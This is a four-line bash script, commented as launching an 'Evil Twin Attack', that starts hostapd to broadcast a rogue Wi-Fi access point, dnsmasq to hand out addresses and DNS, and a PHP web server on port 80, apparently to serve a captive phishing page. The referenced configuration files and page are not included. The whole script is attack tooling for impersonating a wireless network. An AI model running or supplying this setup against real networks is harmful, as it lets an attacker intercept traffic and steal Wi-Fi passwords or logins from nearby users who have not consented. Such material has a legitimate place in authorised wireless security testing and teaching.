#!/bin/bash
# Launches Evil Twin Attack
hostapd hostapd.conf &
dnsmasq -C dnsmasq.conf &
php -S 0.0.0.0:80